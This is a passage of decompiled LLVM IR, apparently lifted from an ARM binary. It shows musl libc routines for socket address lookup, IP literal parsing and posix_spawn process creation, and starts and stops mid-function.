dec_label_pc_123b4:                               ; preds = %dec_label_pc_122f4, %dec_label_pc_122a0
  %v1_1230c.lcssa = phi i32 [ %v1_122a8, %dec_label_pc_122a0 ], [ %v2_12300, %dec_label_pc_122f4 ]
  store i32 %v2_122a0, i32* %sl.global-to-local, align 4
  store i32 %v1_122a4, i32* %sb.global-to-local, align 4
  %v1_123bc6 = add nsw i32 %v5_12290, -1
  store i32 %v1_123bc6, i32* %r8.global-to-local, align 4
  %v2_123bc7 = icmp eq i32 %v5_12290, 0
  br i1 %v2_123bc7, label %dec_label_pc_123d8, label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123b4, %dec_label_pc_123ac.dec_label_pc_123c4_crit_edge
  %v1_12318.pre = phi i32 [ %v1_12318.pre.pre, %dec_label_pc_123ac.dec_label_pc_123c4_crit_edge ], [ %arg2, %dec_label_pc_123b4 ]
  %v1_123c4 = phi i32 [ %v2_123ac, %dec_label_pc_123ac.dec_label_pc_123c4_crit_edge ], [ %v1_1230c.lcssa, %dec_label_pc_123b4 ]
  %v0_12394 = phi i32 [ %v0_123c4.pre, %dec_label_pc_123ac.dec_label_pc_123c4_crit_edge ], [ %arg1, %dec_label_pc_123b4 ]
  %v2_123c4 = sub i32 %v1_123c4, %v0_12394
  br label %dec_label_pc_12318

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123ac, %dec_label_pc_123b4, %dec_label_pc_122d0, %dec_label_pc_122e0, %dec_label_pc_122ec, %dec_label_pc_12380, %dec_label_pc_12358, %dec_label_pc_12350, %dec_label_pc_12344, %dec_label_pc_12334, %dec_label_pc_12270, %dec_label_pc_1227c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ -1, %dec_label_pc_1227c ], [ 0, %dec_label_pc_12270 ], [ 0, %dec_label_pc_123b4 ], [ 0, %dec_label_pc_123ac ], [ -1, %dec_label_pc_12334 ], [ -1, %dec_label_pc_12344 ], [ -1, %dec_label_pc_12350 ], [ -1, %dec_label_pc_12358 ], [ -1, %dec_label_pc_12380 ], [ -1, %dec_label_pc_122ec ], [ -1, %dec_label_pc_122e0 ], [ -1, %dec_label_pc_122d0 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_123c4, { 1, 0 }
  uselistorder i32 %v1_12318.pre, { 1, 0 }
  uselistorder i32 %v2_12364, { 1, 0, 2, 3 }
  uselistorder i1 %v7_12338, { 1, 0 }
  uselistorder i32 %v2_12318, { 1, 0 }
  uselistorder i32 %v0_1231c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12314, { 1, 0, 2, 4, 3 }
  uselistorder i1 %v7_122d4, { 1, 0 }
  uselistorder i32 %v0_122b8, { 1, 0 }
  uselistorder i32 %v0_122b0, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_122a4, { 1, 0, 2 }
  uselistorder i32 %v5_12290, { 2, 3, 0, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 3, 1, 5, 4, 7, 6, 9, 8 }
  uselistorder label %dec_label_pc_123d8, { 1, 0, 5, 6, 7, 8, 9, 4, 3, 2, 11, 10, 12 }
  uselistorder label %dec_label_pc_12350, { 1, 0 }
  uselistorder label %dec_label_pc_12334, { 1, 0 }
  uselistorder label %dec_label_pc_122ec, { 1, 0 }
  uselistorder label %dec_label_pc_122d0, { 1, 0 }
}

define i32 @getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_123e8 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_123fc = call i32 @__syscall_ret()
  store i32 %v3_123e8, i32* @r4, align 4
  ret i32 %v0_123fc
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_12428 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_12428
}

define i32 @__lookup_ipliteral() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v3_12430 = load i32, i32* @r4, align 4
  %v6_12430 = load i32, i32* @r5, align 4
  %v9_12430 = load i32, i32* @r6, align 4
  %v12_12430 = load i32, i32* @r7, align 4
  %v15_12430 = load i32, i32* @r8, align 4
  %v18_12430 = load i32, i32* @sl, align 4
  %v2_12434 = ptrtoint i32* %stack_var_-120 to i32
  %v0_12438 = load i32, i32* @r1, align 4
  store i32 %v0_12438, i32* @r6, align 4
  %v2_1243c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1243c, i32* @r4, align 4
  %v0_12440 = load i32, i32* @r0, align 4
  store i32 %v0_12440, i32* @r8, align 4
  store i32 %v0_12438, i32* %r0.global-to-local, align 4
  %v0_1244c = load i32, i32* @r2, align 4
  store i32 %v0_1244c, i32* @sl, align 4
  %v2_12450 = inttoptr i32 %v0_12438 to i8*
  %v3_12450 = call i32 @__inet_aton(i8* %v2_12450, i32 %v2_1243c)
  store i32 %v3_12450, i32* %r0.global-to-local, align 4
  %tmp26 = icmp slt i32 %v3_12450, 1
  br i1 %tmp26, label %dec_label_pc_1248c, label %dec_label_pc_1245c

dec_label_pc_1245c:                               ; preds = %entry
  %v0_1245c = load i32, i32* @sl, align 4
  %v7_1245c = icmp eq i32 %v0_1245c, 10
  br i1 %v7_1245c, label %dec_label_pc_125b4, label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_1245c
  %v0_1246c = load i32, i32* @r8, align 4
  %v1_1246c = add i32 %v0_1246c, 8
  store i32 %v1_1246c, i32* %r0.global-to-local, align 4
  %v3_12470 = inttoptr i32 %v1_1246c to i16*
  %v4_12470 = call i32 @memcpy(i16* %v3_12470, i32 %v2_1243c, i32 4)
  store i32 %v4_12470, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12478 = load i32, i32* @r8, align 4
  %v2_12478 = add i32 %v1_12478, 4
  %v3_12478 = inttoptr i32 %v2_12478 to i32*
  store i32 0, i32* %v3_12478, align 4
  store i32 1, i32* @r2, align 4
  %v0_12480 = load i32, i32* %r3.global-to-local, align 4
  %v1_12480 = add i32 %v0_12480, 2
  store i32 %v1_12480, i32* @r3, align 4
  %v1_12484 = load i32, i32* @r8, align 4
  %v2_12484 = inttoptr i32 %v1_12484 to i32*
  store i32 %v1_12480, i32* %v2_12484, align 4
  br label %dec_label_pc_125b8

dec_label_pc_1248c:                               ; preds = %entry
  %v0_1248c = load i32, i32* @r6, align 4
  store i32 %v0_1248c, i32* @r0, align 4
  %v2_12494 = call i32 @strchr(i32 %v0_1248c, i32 37)
  store i32 %v2_12494, i32* %r0.global-to-local, align 4
  store i32 %v2_12494, i32* @r7, align 4
  %v3_12498 = icmp eq i32 %v2_12494, 0
  %v0_124d8.pre = load i32, i32* @r6, align 4
  br i1 %v3_12498, label %dec_label_pc_124d0, label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_1248c
  %v2_124a0 = sub i32 %v2_12494, %v0_124d8.pre
  store i32 %v2_124a0, i32* @r5, align 4
  %v8_124a8 = icmp sgt i32 %v2_124a0, 63
  br i1 %v8_124a8, label %dec_label_pc_124d0, label %dec_label_pc_124ac

dec_label_pc_124ac:                               ; preds = %dec_label_pc_124a0
  store i32 %v2_12434, i32* %r0.global-to-local, align 4
  %v3_124b8 = bitcast i32* %stack_var_-120 to i16*
  %v4_124b8 = call i32 @memcpy(i16* %v3_124b8, i32 %v0_124d8.pre, i32 %v2_124a0)
  store i32 %v4_124b8, i32* %r0.global-to-local, align 4
  %v2_124bc = ptrtoint i32* %stack_var_-32 to i32
  %v1_124c0 = load i32, i32* @r5, align 4
  %v2_124c0 = add i32 %v1_124c0, %v2_124bc
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_124c8 = add i32 %v2_124c0, -88
  %v4_124c8 = inttoptr i32 %v3_124c8 to i8*
  store i8 0, i8* %v4_124c8, align 1
  store i32 %v2_12434, i32* @r6, align 4
  br label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_1248c, %dec_label_pc_124a0, %dec_label_pc_124ac
  %v0_124d8 = phi i32 [ %v0_124d8.pre, %dec_label_pc_124a0 ], [ %v2_12434, %dec_label_pc_124ac ], [ %v0_124d8.pre, %dec_label_pc_1248c ]
  %v2_124d0 = ptrtoint i8* %stack_var_-56 to i32
  store i32 %v2_124d0, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v4_124e0 = call i32 @inet_pton(i16 10, i32 %v0_124d8, i32 %v2_124d0)
  store i32 %v4_124e0, i32* %r0.global-to-local, align 4
  %tmp27 = icmp slt i32 %v4_124e0, 1
  br i1 %tmp27, label %.thread, label %dec_label_pc_124f0

.thread:                                          ; preds = %dec_label_pc_124d0
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_125b8

dec_label_pc_124f0:                               ; preds = %dec_label_pc_124d0
  %v0_124f0 = load i32, i32* @sl, align 4
  %v7_124f0 = icmp eq i32 %v0_124f0, 2
  br i1 %v7_124f0, label %dec_label_pc_125b4, label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124f0
  %v0_12500 = load i32, i32* @r8, align 4
  %v1_12500 = add i32 %v0_12500, 8
  store i32 %v1_12500, i32* %r0.global-to-local, align 4
  %v3_12504 = inttoptr i32 %v1_12500 to i16*
  %v4_12504 = call i32 @memcpy(i16* %v3_12504, i32 %v2_124d0, i32 16)
  store i32 %v4_12504, i32* %r0.global-to-local, align 4
  %v0_12508 = load i32, i32* @r7, align 4
  %v2_12508 = icmp eq i32 %v0_12508, 0
  %v1_12510 = load i32, i32* @r8, align 4
  %v2_12510 = inttoptr i32 %v1_12510 to i32*
  store i32 10, i32* %v2_12510, align 4
  br i1 %v2_12508, label %.thread6, label %dec_label_pc_1251c

.thread6:                                         ; preds = %dec_label_pc_124f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125a8

dec_label_pc_1251c:                               ; preds = %dec_label_pc_124f8
  %v0_1251c = load i32, i32* @r7, align 4
  %v1_1251c = add i32 %v0_1251c, 1
  %v2_1251c = inttoptr i32 %v1_1251c to i8*
  %v3_1251c = load i8, i8* %v2_1251c, align 1
  %v4_1251c = zext i8 %v3_1251c to i32
  %v1_12520 = add nsw i32 %v4_1251c, -48
  store i32 %v1_12520, i32* %r3.global-to-local, align 4
  %v2_12524 = icmp ugt i32 %v1_12520, 8
  %v7_12524 = icmp eq i32 %v1_12520, 9
  %v2_1252c = xor i1 %v7_12524, true
  %v3_1252c = and i1 %v2_12524, %v2_1252c
  br i1 %v3_1252c, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_1251c
  %v9_1252c = inttoptr i32 %v0_1251c to i8*
  store i8* %v9_1252c, i8** %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1251c, %bb
  %v2_12538 = xor i1 %v2_12524, true
  %v3_12538 = or i1 %v7_12524, %v2_12538
  br i1 %v3_12538, label %bb28, label %.thread12

bb28:                                             ; preds = %.thread10
  store i32 %v1_1251c, i32* %r0.global-to-local, align 4
  %v6_1253c = ptrtoint i8** %stack_var_-40 to i32
  store i32 %v6_1253c, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %.thread10, %bb28
  call void @__pseudo_cond_branch(i1 %v3_12538, i32 ptrtoint (i32* @global_var_f82c.629 to i32))
  %v3_12544 = load i8*, i8** %stack_var_-40, align 4
  %v4_12544 = ptrtoint i8* %v3_12544 to i32
  store i32 %v4_12544, i32* %r3.global-to-local, align 4
  %v2_12548 = load i8, i8* %v3_12544, align 1
  %v3_12548 = zext i8 %v2_12548 to i32
  store i32 %v3_12548, i32* @r3, align 4
  %v2_1254c = icmp eq i8 %v2_12548, 0
  br i1 %v2_1254c, label %dec_label_pc_125a0, label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %.thread12
  %v3_12554 = load i8, i8* %stack_var_-56, align 1
  %v4_12554 = sext i8 %v3_12554 to i32
  store i32 %v4_12554, i32* @r3, align 4
  br label %dec_label_pc_125b4

dec_label_pc_125a0:                               ; preds = %.thread12
  %v0_125a0 = load i32, i32* @r1, align 4
  %v2_125a0 = icmp eq i32 %v0_125a0, 0
  br i1 %v2_125a0, label %dec_label_pc_125a0.dec_label_pc_125a8_crit_edge, label %dec_label_pc_125b4

dec_label_pc_125a0.dec_label_pc_125a8_crit_edge:  ; preds = %dec_label_pc_125a0
  %v0_125ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_125a0.dec_label_pc_125a8_crit_edge, %.thread6
  %v0_125ac = phi i32 [ %v0_125ac.pre, %dec_label_pc_125a0.dec_label_pc_125a8_crit_edge ], [ 0, %.thread6 ]
  store i32 1, i32* @r2, align 4
  %v1_125ac = load i32, i32* @r8, align 4
  %v2_125ac = add i32 %v1_125ac, 4
  %v3_125ac = inttoptr i32 %v2_125ac to i32*
  store i32 %v0_125ac, i32* %v3_125ac, align 4
  br label %dec_label_pc_125b8

dec_label_pc_125b4:                               ; preds = %dec_label_pc_12554, %dec_label_pc_125a0, %dec_label_pc_124f0, %dec_label_pc_1245c
  store i32 -2, i32* @r2, align 4
  br label %dec_label_pc_125b8

dec_label_pc_125b8:                               ; preds = %.thread, %dec_label_pc_125a8, %dec_label_pc_12464, %dec_label_pc_125b4
  %v0_125b8 = load i32, i32* @r2, align 4
  store i32 %v0_125b8, i32* %r0.global-to-local, align 4
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  store i32 %v12_12430, i32* @r7, align 4
  store i32 %v15_12430, i32* @r8, align 4
  store i32 %v18_12430, i32* @sl, align 4
  ret i32 %v0_125b8

; uselistorder directives
  uselistorder i1 %v7_12524, { 1, 0 }
  uselistorder i32 %v0_124d8.pre, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12438, { 1, 0, 2 }
  uselistorder i8* %stack_var_-56, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 8, 7, 10, 9, 11, 13, 12, 15, 14 }
  uselistorder i16 10, { 0, 2, 1 }
  uselistorder label %dec_label_pc_125b8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_125b4, { 1, 0, 2, 3 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_124d0, { 2, 1, 0 }
}

define i32 @___syscall3.11(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  ret i32 %arg2
}

define i32 @__posix_spawnx() local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %v3_125e8 = load i32, i32* @r4, align 4
  %v9_125e8 = load i32, i32* @r6, align 4
  %v12_125e8 = load i32, i32* @r7, align 4
  %v2_125f0 = ptrtoint i32* %stack_var_-224 to i32
  store i32 0, i32* @ip, align 4
  %v0_125f8 = load i32, i32* @r0, align 4
  store i32 %v0_125f8, i32* %sb.global-to-local, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v0_12610 = load i32, i32* @r3, align 4
  store i32 %v0_12610, i32* @r7, align 4
  %v3_12618 = call i32 @pipe2(i32* nonnull %stack_var_-224, i32 524288)
  store i32 %v3_12618, i32* @r5, align 4
  %v2_1261c = icmp eq i32 %v3_12618, 0
  br i1 %v2_1261c, label %dec_label_pc_12630, label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %entry
  %v0_12624 = call i32 @__errno_location()
  %v1_12628 = inttoptr i32 %v0_12624 to i32*
  br label %dec_label_pc_12748

dec_label_pc_12630:                               ; preds = %entry
  %v3_1263c = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-40)
  %v0_12640 = load i32, i32* @r4, align 4
  %v2_12640 = icmp eq i32 %v0_12640, 0
  %v3_12644 = ptrtoint i32* %stack_var_-560 to i32
  br i1 %v2_12640, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12630
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12630, %bb
  store i32 75352, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12640, i32 ptrtoint (i32* @global_var_fe7c.630 to i32))
  %v2_12678 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_12678, i32* @r2, align 4
  %v0_1267c = load i32, i32* @r5, align 4
  store i32 %v0_1267c, i32* @r0, align 4
  %v0_12694 = call i32 @pthread_sigmask()
  %v4_126a8 = call i32 @__clone(i32 ptrtoint (i32* @global_var_12798.638 to i32), i32 %v3_12644, i32 16657, i32 %v2_125f0)
  store i32 %v4_126a8, i32* @r4, align 4
  %v1_126b4 = call i32 @close(i32 %tmp)
  %v0_126b8 = load i32, i32* @r4, align 4
  %tmp35 = icmp slt i32 %v0_126b8, 1
  br i1 %tmp35, label %bb36, label %dec_label_pc_126c8

bb36:                                             ; preds = %.thread2
  %v6_126bc = sub i32 0, %v0_126b8
  store i32 %v6_126bc, i32* %stack_var_-36, align 4
  br label %dec_label_pc_12700

dec_label_pc_126c8:                               ; preds = %.thread2
  %v3_126cc = load i32, i32* %stack_var_-224, align 4
  %v2_126d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_126d8 = call i32 @read(i32 %v3_126cc, i32 %v2_126d0, i32 4)
  %v7_126dc = icmp eq i32 %v3_126d8, 4
  %v0_126ec.pre = load i32, i32* @r5, align 4
  br i1 %v7_126dc, label %dec_label_pc_126e8, label %bb37

bb37:                                             ; preds = %dec_label_pc_126c8
  store i32 %v0_126ec.pre, i32* %stack_var_-36, align 4
  br label %dec_label_pc_12700

dec_label_pc_126e8:                               ; preds = %dec_label_pc_126c8
  %v0_126f0 = load i32, i32* @r4, align 4
  %v2_126f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_126ec.pre, i32* %stack_var_-44, align 4
  %v3_126fc = call i32 @waitpid(i32 %v0_126f0, i32 %v2_126f4, i32 %v0_126ec.pre)
  br label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %bb36, %bb37, %dec_label_pc_126e8
  %v3_12700 = load i32, i32* %stack_var_-224, align 4
  %v1_12704 = call i32 @close(i32 %v3_12700)
  %v3_12708 = load i32, i32* %stack_var_-36, align 4
  %v1_1270c = sub i32 1, %v3_12708
  %v2_1270c = icmp ult i32 %v3_12708, 2
  br i1 %v2_1270c, label %bb39, label %bb38

bb38:                                             ; preds = %dec_label_pc_12700
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_12700, %bb38
  %v0_1271c.pr = phi i32 [ %v1_1270c, %dec_label_pc_12700 ], [ 0, %bb38 ]
  %v0_12714 = load i32, i32* %sb.global-to-local, align 4
  %v2_12714 = icmp eq i32 %v0_12714, 0
  br i1 %v2_12714, label %bb40, label %thread-pre-split

bb40:                                             ; preds = %bb39
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb39, %bb40
  %v0_1271c = phi i32 [ 0, %bb40 ], [ %v0_1271c.pr, %bb39 ]
  %v2_1271c = icmp eq i32 %v0_1271c, 0
  br i1 %v2_1271c, label %bb42, label %bb41

bb41:                                             ; preds = %thread-pre-split
  %v1_12724 = load i32, i32* @r4, align 4
  %v3_12724 = inttoptr i32 %v0_12714 to i32*
  store i32 %v1_12724, i32* %v3_12724, align 4
  br label %bb42

bb42:                                             ; preds = %thread-pre-split, %bb41
  store i32 0, i32* @r2, align 4
  store i32 2, i32* @r0, align 4
  %v0_12734 = call i32 @pthread_sigmask()
  %v3_12738 = load i32, i32* %stack_var_-40, align 4
  %v3_12740 = call i32 @__pthread_setcancelstate(i32 %v3_12738, i32* null)
  br label %dec_label_pc_12748

dec_label_pc_12748:                               ; preds = %dec_label_pc_12624, %bb42
  %storemerge.in = phi i32* [ %v1_12628, %dec_label_pc_12624 ], [ %stack_var_-36, %bb42 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %v3_125e8, i32* @r4, align 4
  store i32 %v9_125e8, i32* @r6, align 4
  store i32 %v12_125e8, i32* @r7, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_12708, { 1, 0 }
  uselistorder i32 %v0_126ec.pre, { 2, 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* null, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 1, 0, 2 }
  uselistorder i32 (i32, i32*)* @__pthread_setcancelstate, { 3, 4, 0, 1, 2, 5 }
  uselistorder label %dec_label_pc_12748, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb39, { 1, 0 }
  uselistorder label %dec_label_pc_12700, { 2, 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @posix_spawn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 81832, i32* @r2, align 4
  %v0_12784 = call i32 @__posix_spawnx()
  ret i32 %v0_12784
}

define i32 @child(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %v2_1279c = ptrtoint i32* %stack_var_-312 to i32
  store i32 %tmp, i32* @r6, align 4
  store i32 0, i32* @r1, align 4
  store i32 140, i32* @r2, align 4
  store i32 %v2_1279c, i32* @r0, align 4
  %v0_127b0 = call i32 @memset()
  %v2_127b4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %v2_127b4, i32* @r4, align 4
  %v0_127b8 = load i32, i32* @r6, align 4
  %v1_127b8 = inttoptr i32 %v0_127b8 to i32*
  %v2_127b8 = load i32, i32* %v1_127b8, align 4
  %v1_127bc = add i32 %v0_127b8, 148
  %v2_127bc = inttoptr i32 %v1_127bc to i32*
  %v3_127bc = load i32, i32* %v2_127bc, align 4
  store i32 %v3_127bc, i32* @r8, align 4
  %v1_127c0 = add i32 %v0_127b8, 4
  %v2_127c0 = inttoptr i32 %v1_127c0 to i32*
  %v3_127c0 = load i32, i32* %v2_127c0, align 4
  store i32 %v3_127c0, i32* @sl, align 4
  %v1_127c4 = add i32 %v0_127b8, 144
  %v2_127c4 = inttoptr i32 %v1_127c4 to i32*
  %v3_127c4 = load i32, i32* %v2_127c4, align 4
  store i32 %v3_127c4, i32* @sb, align 4
  %v1_127c8 = call i32 @close(i32 %v2_127b8)
  store i32 %v2_127b4, i32* @r0, align 4
  %v1_127d0 = call i32 @__get_handler_set(i32 %v2_127b4)
  store i32 1, i32* @r7, align 4
  store i32 1, i32* @fp, align 4
  %v0_127dc = load i32, i32* @r8, align 4
  %v1_127dc = add i32 %v0_127dc, 8
  store i32 %v1_127dc, i32* @r4, align 4
  br label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_12858, %entry
  %v0_127f0 = phi i32 [ 1, %entry ], [ %v1_12858, %dec_label_pc_12858 ]
  %v0_127e0 = phi i32 [ %v0_127dc, %entry ], [ %v0_12864, %dec_label_pc_12858 ]
  %v1_127e0 = inttoptr i32 %v0_127e0 to i32*
  %v2_127e0 = load i32, i32* %v1_127e0, align 4
  store i32 %v2_127e0, i32* @r3, align 4
  %v1_127e4 = and i32 %v2_127e0, 4
  %v2_127e4 = icmp eq i32 %v1_127e4, 0
  br i1 %v2_127e4, label %dec_label_pc_12800, label %dec_label_pc_127ec

dec_label_pc_127ec:                               ; preds = %dec_label_pc_127e0
  %v0_127ec = load i32, i32* @r4, align 4
  %v2_127f4 = call i32 @sigismember(i32 %v0_127ec, i32 %v0_127f0)
  %v2_127f8 = icmp eq i32 %v2_127f4, 0
  br i1 %v2_127f8, label %dec_label_pc_127ec.dec_label_pc_12800_crit_edge, label %dec_label_pc_12840

dec_label_pc_127ec.dec_label_pc_12800_crit_edge:  ; preds = %dec_label_pc_127ec
  %v0_12804.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12800

dec_label_pc_12800:                               ; preds = %dec_label_pc_127ec.dec_label_pc_12800_crit_edge, %dec_label_pc_127e0
  %v0_12804 = phi i32 [ %v0_12804.pre, %dec_label_pc_127ec.dec_label_pc_12800_crit_edge ], [ %v0_127f0, %dec_label_pc_127e0 ]
  %v2_12808 = call i32 @sigismember(i32 %v2_127b4, i32 %v0_12804)
  %v2_1280c = icmp eq i32 %v2_12808, 0
  br i1 %v2_1280c, label %dec_label_pc_12858, label %dec_label_pc_12814

dec_label_pc_12814:                               ; preds = %dec_label_pc_12800
  %v0_12814 = load i32, i32* @r7, align 4
  %v1_12814 = add i32 %v0_12814, -32
  %tmp28 = icmp ult i32 %v1_12814, 3
  br i1 %tmp28, label %.thread, label %dec_label_pc_12824

.thread:                                          ; preds = %dec_label_pc_12814
  %v4_1281c = load i32, i32* @fp, align 4
  store i32 %v4_1281c, i32* %stack_var_-312, align 4
  br label %dec_label_pc_12848

dec_label_pc_12824:                               ; preds = %dec_label_pc_12814
  store i32 %v0_12814, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_1279c, i32* @r2, align 4
  %v0_12830 = call i32 @__libc_sigaction()
  %v2_12834 = load i32, i32* %stack_var_-312, align 4
  %v7_12838 = icmp eq i32 %v2_12834, 1
  br i1 %v7_12838, label %dec_label_pc_12858, label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_127ec, %dec_label_pc_12824
  store i32 0, i32* %stack_var_-312, align 4
  %v0_12848.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12848

dec_label_pc_12848:                               ; preds = %.thread, %dec_label_pc_12840
  %v0_12848 = phi i32 [ %v0_12848.pre, %dec_label_pc_12840 ], [ %v0_12814, %.thread ]
  store i32 %v0_12848, i32* @r0, align 4
  store i32 %v2_1279c, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v0_12854 = call i32 @__libc_sigaction()
  br label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %dec_label_pc_12824, %dec_label_pc_12800, %dec_label_pc_12848
  %v0_128a89 = phi i32 [ %v0_12830, %dec_label_pc_12824 ], [ 0, %dec_label_pc_12800 ], [ %v0_12854, %dec_label_pc_12848 ]
  %v0_12858 = load i32, i32* @r7, align 4
  %v1_12858 = add i32 %v0_12858, 1
  store i32 %v1_12858, i32* @r7, align 4
  %v7_1285c = icmp eq i32 %v1_12858, 65
  %v0_12864 = load i32, i32* @r8, align 4
  br i1 %v7_1285c, label %dec_label_pc_12864, label %dec_label_pc_127e0

dec_label_pc_12864:                               ; preds = %dec_label_pc_12858
  %v1_12864 = inttoptr i32 %v0_12864 to i32*
  %v2_12864 = load i32, i32* %v1_12864, align 4
  %v1_12868 = and i32 %v2_12864, 2
  %v2_12868 = icmp eq i32 %v1_12868, 0
  br i1 %v2_12868, label %dec_label_pc_1288c, label %dec_label_pc_12870

dec_label_pc_12870:                               ; preds = %dec_label_pc_12864
  store i32 57, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %dec_label_pc_12870, %dec_label_pc_12864
  %v0_128c8 = phi i32 [ 0, %dec_label_pc_12870 ], [ %v0_128a89, %dec_label_pc_12864 ]
  %v2_1288c = load i32, i32* %v1_12864, align 4
  %v1_12890 = urem i32 %v2_1288c, 2
  %v2_12890 = icmp eq i32 %v1_12890, 0
  br i1 %v2_12890, label %dec_label_pc_128d0, label %dec_label_pc_12898

dec_label_pc_12898:                               ; preds = %dec_label_pc_1288c
  %v2_128a8 = icmp eq i32 %v0_128c8, 0
  store i32 %v0_128c8, i32* %stack_var_-44, align 4
  br i1 %v2_128a8, label %dec_label_pc_128b4, label %dec_label_pc_12a30

dec_label_pc_128b4:                               ; preds = %dec_label_pc_12898
  store i32 213, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128b4, %dec_label_pc_1288c
  %v0_128d0 = load i32, i32* @sb, align 4
  %v2_128d0 = icmp eq i32 %v0_128d0, 0
  br i1 %v2_128d0, label %dec_label_pc_129d8, label %dec_label_pc_128d8

